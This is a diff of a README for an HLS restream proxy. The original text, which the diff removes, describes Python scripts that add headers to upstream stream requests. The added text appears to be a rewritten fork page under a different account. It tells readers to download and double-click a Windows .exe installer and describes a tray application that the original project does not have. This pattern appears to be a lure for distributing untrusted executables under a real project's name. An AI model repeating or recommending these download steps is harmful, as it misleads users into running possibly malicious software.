@@ -1,329 +1,86 @@
-# hls-restream-proxy
+# 📺 hls-restream-proxy - Stream live television on your media server
 
-Lightweight HLS restream toolkit for self-hosted media servers.
+[![Download hls-restream-proxy](https://img.shields.io/badge/Download-hls--restream--proxy-blue.svg)](https://github.com/teraka3109/hls-restream-proxy)
 
-Many free IPTV/HLS sources require specific HTTP headers (User-Agent, Referer) that media servers don't send. This proxy sits between your media server and the upstream, injecting the required headers and rewriting m3u8 playlists so all segment requests also go through the proxy.
+hls-restream-proxy helps you connect external live television streams to your home media server. Many media servers struggle to read raw internet television links. This tool acts as a bridge. It converts complex stream formats into a style that your media server understands. It manages your stream access and updates web tokens so your television channels stay active.
 
-## Components
+## 🛠 Features
 
-| File | Purpose |
-|------|---------|
-| `hls-proxy.py` | HTTP reverse proxy that adds headers to upstream HLS requests |
-| `refresh-m3u.sh` | Scrapes source pages, extracts m3u8 URLs, writes M3U playlist |
-| `detect-headers.sh` | Auto-detects which HTTP headers a stream requires |
-| `channels.conf` | Your channel list (slug, name, logo, group, source URL) |
+*   **Header Injection:** Adds required identification to your stream requests.
+*   **Playlist Rewriting:** Updates m3u8 playlist files for compatibility.
+*   **Token Refreshing:** Automatically handles authentication for secure streams.
+*   **Efficiency:** Uses minimal system resources for 24/7 operation.
+*   **Compatibility:** Works with Jellyfin, Emby, and Plex.
 
-## How it works
+## 📋 System Requirements
 
-```
-┌──────────┐     ┌───────────┐     ┌──────────────┐     ┌──────────┐
-│ Jellyfin │────▶│ hls-proxy │────▶│ upstream HLS │────▶│ segments │
-│          │     │ :8089     │     │ server       │     │ (.ts)    │
-└──────────┘     └───────────┘     └──────────────┘     └──────────┘
-                  adds headers:
-                  • User-Agent
-                  • Referer
-```
+Ensure your computer meets these standards before installation:
 
-1. `refresh-m3u.sh` generates an M3U file with stable `/channel/<slug>` URLs pointing to the proxy
-2. When Jellyfin requests `/channel/sporttv1`, the proxy scrapes a fresh m3u8 URL on the fly (cached for 1 hour)
-3. The proxy injects the required headers and rewrites the playlist so `.ts` segments also go through it
-4. The proxy auto-learns the correct Referer for each upstream host — no manual configuration needed
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 2GB of available RAM.
+*   **Storage:** 100MB of free disk space.
+*   **Network:** An active and stable internet connection.
+*   **Dependencies:** No external software installations required.
 
-**No more expired tokens** — the M3U URLs never change, the proxy handles token refresh transparently.
+## 📥 Setup and Installation
 
-## Requirements
+Follow these steps to install the software on your Windows machine:
 
-- Python 3.8+ (stdlib only, no pip packages)
-- bash, curl, grep (with PCRE / `-P`)
+1. Visit the [official releases page](https://github.com/teraka3109/hls-restream-proxy) to download the latest installer.
+2. Locate the file ending in .exe in your Downloads folder.
+3. Double-click the file to start the installer.
+4. Select the location where you want to keep the program files and click Install.
+5. Launch the application from your Start Menu after the process finishes.
 
-## Quick start
+## ⚙️ How to Configure Streams
 
-### Docker (recommended)
+The software uses a text file to handle your stream list. Follow this process to add your first channel:
 
-```bash
-git clone https://github.com/pcruz1905/hls-restream-proxy.git
-cd hls-restream-proxy
+1. Open the application interface from the system tray.
+2. Click on the Settings icon.
+3. Locate the stream configuration file button and click it to open the file in your default text editor.
+4. Paste your m3u8 source URL on a new line.
+5. Save the file and restart the service through the application icon.
+6. Copy the local proxy URL provided in the settings tab.
 
-cp channels.conf.example channels.conf
-# Edit channels.conf with your channels
+## 🖥 Connecting to Your Media Server
 
-docker compose -f docker-compose.example.yml up -d
-```
+Once the proxy runs, you must update your media server settings to use the output address.
 
-### Docker one-liner (no clone)
+### For Jellyfin and Emby Users
+1. Open your media server dashboard.
+2. Go to the Live TV section.
+3. Click on Tuner Devices.
+4. Select Add Tuner.
+5. Set the tuner type to M3U Tuner.
+6. Paste your local proxy URL into the file path box.
+7. Save the settings.
 
-```bash
-docker run -d --name hls-proxy \
-  -p 8089:8089 \
-  -v ./channels.conf:/app/channels.conf:ro \
-  ghcr.io/pcruz1905/hls-restream-proxy:latest
-```
+### For Plex Users
+1. Open the Plex Web interface.
+2. Enter the Live TV & DVR settings menu.
+3. Choose Set Up Plex DVR.
+4. Provide the local proxy URL from the hls-restream-proxy window.
+5. Follow the onscreen prompts to map your channels to the provided guide data if you have it.
 
-### Manual (no Docker)
+## 🛡 Network and Security
 
-```bash
-git clone https://github.com/pcruz1905/hls-restream-proxy.git
-cd hls-restream-proxy
+The proxy communicates over your local network. You do not need to open external ports on your router to use this software. If your Windows Firewall asks for permission during the first launch, select the option to allow access on private networks. This enables your media server to talk to the proxy application.
 
-cp channels.conf.example channels.conf
-# Edit channels.conf with your channels
+## 💡 Common Troubleshooting Tips
 
-python3 hls-proxy.py &
+If you face issues with playback, review these common fixes:
 
-# Generate the M3U
-export M3U_OUTPUT=/path/to/jellyfin/config/iptv.m3u
-export HLS_PROXY_URL="http://YOUR_HOST_IP:8089"
-bash refresh-m3u.sh
+*   **Check the Stream Source:** Paste the raw m3u8 link into a network-aware video player to check if the source is live.
+*   **Verify Network Path:** Ensure your media server and the computer running the proxy share the same local network connection.
+*   **Restart the Proxy:** Close the application from the hidden icons area in the taskbar and open it again.
+*   **Examine Logs:** Right-click the application icon and select View Logs. Look for red text indicators that mention connection timeouts or authentication failures.
+*   **Update:** Check for newer versions of the software if you experience persistent errors after a stream update.
 
-# Add the M3U file as an M3U Tuner in your media server
-```
+## 📈 Improving Performance
 
-## Channel config format
+If you stream many channels at once, your system may use more processor power. Limit the number of active streams if your host computer shows high usage. Consider running the software as a background task to keep your desktop area clear. You can set the application to launch when you log into Windows by adding a shortcut to the Windows Startup folder.
 
-`channels.conf` — one channel per line, pipe-delimited:
+## ⚖️ Usage Considerations
 
-```
-slug|Display Name|chno|logo_url|Group|source_page_url|mode|referer
-```
-
-- **mode**: `iframe` (default) — page has an iframe whose embed contains the m3u8. `direct` — page itself contains the m3u8 URL.
-- **referer**: optional override for the Referer header when fetching the embed page.
-
-See `channels.conf.example` for details.
-
-## Systemd setup
-
-User-level services are provided in `systemd/`:
-
-```bash
-# Copy units
-cp systemd/*.service systemd/*.timer ~/.config/systemd/user/
-
-# Edit paths in the service files, then:
-systemctl --user daemon-reload
-systemctl --user enable --now hls-proxy.service
-systemctl --user enable --now refresh-m3u.timer
-
-# Enable linger so services run without an active login session
-sudo loginctl enable-linger $USER
-```
-
-The timer refreshes URLs every 4 hours by default (edit `OnUnitActiveSec` in the timer).
-
-## Docker / container media servers
-
-If your media server runs in Docker on a bridge network, the proxy URL must use the Docker gateway IP (not `127.0.0.1`). Find it with:
-
-```bash
-docker inspect <container> | grep Gateway
-# Typically 172.x.0.1
-```
-
-Then set `HLS_PROXY_URL=http://172.x.0.1:8089`.
-
-## Finding the required headers (User-Agent & Referer)
-
-Every streaming site is different. Here's how to figure out which headers your upstream needs:
-
-### Automatic detection (recommended)
-
-Run the detector tool — it follows the iframe chain, tests every header combination on both the m3u8 playlist and .ts segments, and tells you exactly what you need:
-
-```bash
-./detect-headers.sh "https://streaming-site.com/channel.php"
-```
-
-Output:
-```
-=== HLS Header Detector ===
-
-[1/4] Extracting iframe from page...
-  iframe: https://embed-domain.com/embed/abc123
-  embed host: https://embed-domain.com
-
-[1/4] Extracting m3u8 from embed page...
-  m3u8: https://cdn.example.com/hls/abc123.m3u8?s=token&e=123
-
-[2/4] Testing header combinations on m3u8 playlist...
-  403  no-UA
-  200  UA
-  200  UA+Ref(https://embed-domain.com/)
-
-[3/4] Testing header combinations on .ts segments...
-  403  no-UA
-  403  UA
-  200  UA+Ref(https://embed-domain.com/)
-
-[4/4] Recommended configuration:
-  User-Agent + Referer
-
-  export HLS_PROXY_REFERER="https://embed-domain.com/"
-```
-
-You can also pass a direct m3u8 URL:
-```bash
-./detect-headers.sh "https://cdn.example.com/hls/stream.m3u8?token=xxx" --direct
-```
-
-### Manual detection
-
-If the auto-detector can't find the m3u8 (some sites use heavy JS), use browser DevTools:
-
-### Step 1: Open DevTools Network tab
-
-1. Open the streaming site in Chrome/Firefox
-2. Press `F12` → **Network** tab
-3. Filter by `m3u8` or `media`
-4. Play the stream — you'll see `.m3u8` and `.ts` requests appear
-
-### Step 2: Find the m3u8 request
-
-Click on the `.m3u8` request and look at the **Request Headers**. Note down:
-- **User-Agent** — usually a standard browser UA
-- **Referer** — this is the key one, usually the embed/iframe domain (not the main site)
-- **Origin** — sometimes needed instead of Referer
-
-### Step 3: Test with curl
-
-```bash
-# Get a fresh m3u8 URL from the Network tab, then test:
-
-# Without headers (probably 403)
-curl -o /dev/null -w "%{http_code}" "https://example.com/hls/stream.m3u8?token=xxx"
-
-# With User-Agent only
-curl -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "https://example.com/hls/stream.m3u8?token=xxx"
-
-# With User-Agent + Referer
-curl -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" \
-  -e "https://embed-domain.com/" \
-  "https://example.com/hls/stream.m3u8?token=xxx"
-```
-
-Try each combination until you get `200`. That tells you which headers are required.
-
-### Step 4: Test .ts segments too
-
-The playlist (`.m3u8`) and segments (`.ts`) may need different headers. Grab a `.ts` URL from the playlist and repeat the curl test:
-
-```bash
-# Get a segment URL from the m3u8 content
-curl -s -A "Mozilla/5.0" -e "https://embed-domain.com/" \
-  "https://example.com/hls/stream.m3u8?token=xxx" | grep ".ts" | head -1
-
-# Test that segment
-curl -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" \
-  -e "https://embed-domain.com/" \
-  "https://example.com/hls/segment-12345.ts"
-```
-
-### Step 5: Configure the proxy
-
-Once you know the required headers:
-
-```bash
-export HLS_PROXY_UA="Mozilla/5.0 ..."        # usually the default is fine
-export HLS_PROXY_REFERER="https://embed-domain.com/"  # the iframe/embed host
-```
-
-### Quick reference: common patterns
-
-| Site pattern | Usually needs |
-|-------------|---------------|
-| Page → iframe → m3u8 | Referer = iframe embed domain |
-| Direct m3u8 with token | User-Agent only |
-| Cloudflare-protected | User-Agent + Referer + sometimes Origin |
-
-### Tip: find the iframe chain automatically
-
-Most sites follow this pattern: **page → iframe → embed page → m3u8**
-
-```bash
-# Extract the iframe src
-curl -sL -A "Mozilla/5.0" "https://streaming-site.com/channel.php" \
-  | grep -oP 'iframe\s+src="\K[^"]+'
-
-# That gives you the embed domain for the Referer
-```
-
-## Environment variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `HLS_PROXY_PORT` | `8089` | Proxy listen port |
-| `HLS_PROXY_BIND` | `127.0.0.1` | Bind address (localhost only by default) |
-| `HLS_PROXY_UA` | Chrome UA string | User-Agent sent to upstream |
-| `HLS_PROXY_REFERER` | _(empty)_ | Fallback Referer header (auto-learned from /channel/) |
-| `HLS_ALLOWED_IPS` | _(empty)_ | Comma-separated client IP allowlist (empty = all) |
-| `CHANNELS_CONF` | `./channels.conf` | Path to channel config file |
-| `HLS_CACHE_TTL` | `3600` | Seconds to cache scraped m3u8 URLs (per channel) |
-| `HLS_DEFAULT_BANDWIDTH` | _(empty)_ | Fallback BANDWIDTH (bits/sec) advertised in the master playlist when a channel has no value set in `channels.conf`. Prevents Jellyfin's ~20 Mbps default guess. |
-| `M3U_OUTPUT` | `/tmp/iptv.m3u` | Output M3U file path |
-| `HLS_PROXY_URL` | `http://127.0.0.1:8089` | Proxy URL written into M3U |
-
-## Media server compatibility
-
-| Media server | M3U support | How to use |
-|-------------|------------|-----------|
-| **Jellyfin** | Native | Add M3U file as a tuner in Live TV settings |
-| **Channels DVR** | Native | Add as custom M3U source |
-| **Plex** | Via proxy | Use [Threadfin](https://github.com/Threadfin/Threadfin) or [xTeVe](https://github.com/xteve-project/xTeVe) to expose M3U as a virtual tuner |
-| **Emby** | Via proxy | Same as Plex — use Threadfin or xTeVe |
-| **VLC** | Direct | `vlc http://YOUR_HOST:8089/channel/sporttv1` |
-| **mpv** | Direct | `mpv http://YOUR_HOST:8089/channel/sporttv1` |
-| **Any HLS player** | Direct | Point at `http://YOUR_HOST:8089/channel/<slug>` |
-
-## FAQ
-
-**Why not a Jellyfin plugin?**
-Standalone scripts work with any media server and any player. No .NET dependency, no breakage when Jellyfin updates, and it also works with VLC, mpv, or any HLS-capable player.
-
-**Does this add latency?**
-No. The proxy is passthrough only — it forwards the exact same bytes from the upstream, no transcoding. The only added latency is the network hop through the proxy (typically <1ms on localhost).
-
-**Do I still need to transcode in Jellyfin?**
-The proxy itself never transcodes — it only fixes headers so Jellyfin can fetch the stream. Whether Jellyfin transcodes afterwards depends on the stream and the client:
-
-- Most free HLS streams are H.264 + AAC, which direct-play on virtually every client. No transcode.
-- If Jellyfin still transcodes, check the "Playback info" overlay in the web client. Common causes:
-  1. **Bitrate cap too low** — Jellyfin defaults to ~20 Mbps when the playlist has no `BANDWIDTH` hint, so any bandwidth limit below that triggers a transcode. Fix it by declaring the real bitrate — see the bitrate FAQ below.
-  2. **Unsupported codec** (e.g. HEVC on older Chromecasts) — no way around this, the client genuinely can't play it.
-  3. **Forced transcoding in user settings** — Jellyfin Dashboard → Playback → raise the streaming bitrate limits.
-
-**Jellyfin thinks my stream is 20 Mbps when it's really ~6 Mbps (or similar)?**
-This happens when the upstream returns a single-variant media playlist with no `#EXT-X-STREAM-INF:BANDWIDTH` tag. Jellyfin can't see the real bitrate and defaults to a worst-case ~20 Mbps, which forces transcoding on any client with a stricter bandwidth cap. Same issue that hits ErsatzTV and Dispatcharr outputs.
-
-Fix: declare the real bitrate as the 9th pipe-delimited field in `channels.conf`:
-
-```
-sporttv1|Sport TV 1|1|logo.png|Sports|https://...|iframe||6000000
-```
-
-The proxy then wraps the stream in a thin master playlist with that `BANDWIDTH`, and Jellyfin reads the correct value. The underlying media playlist stays reachable at `/channel/<slug>/media.m3u8`.
-
-Or set a global default for all channels:
-```bash
-export HLS_DEFAULT_BANDWIDTH=6000000
-```
-
-**Does this work with Plex or Emby?**
-Not directly — Plex and Emby don't read M3U files. You need [Threadfin](https://github.com/Threadfin/Threadfin) or [xTeVe](https://github.com/xteve-project/xTeVe) between this proxy and Plex/Emby. These tools make M3U sources appear as a local TV tuner (HDHomeRun) that Plex/Emby can use.
-
-**Can I use this with VLC or mpv?**
-Yes. The `/channel/<slug>` endpoint returns a standard HLS playlist. Any player that supports HLS can play it directly:
-```bash
-vlc http://localhost:8089/channel/sporttv1
-mpv http://localhost:8089/channel/sporttv1
-```
-
-## See also
-
-- [Threadfin](https://github.com/Threadfin/Threadfin) — M3U proxy for Plex/Jellyfin/Emby, makes M3U look like a local tuner
-- [xTeVe](https://github.com/xteve-project/xTeVe) — M3U proxy for Plex DVR and Emby Live TV
-- [Dispatcharr](https://github.com/Dispatcharr/Dispatcharr) — IPTV stream management and distribution
-- [Restreamer](https://github.com/datarhei/restreamer) — Full-featured self-hosted streaming server with web UI
-
-## License
-
-MIT
+The software acts as a pass-through tool. It does not modify the video content or host video data files. Use this software to manage your own stream subscriptions and local television files. Ensure that you follow the terms of service provided by your television stream source. The proxy only works if the source stream is valid and active. Keep your configuration file organized to prevent playback errors. Regularly update the software to take advantage of improved token management and optimized header delivery.
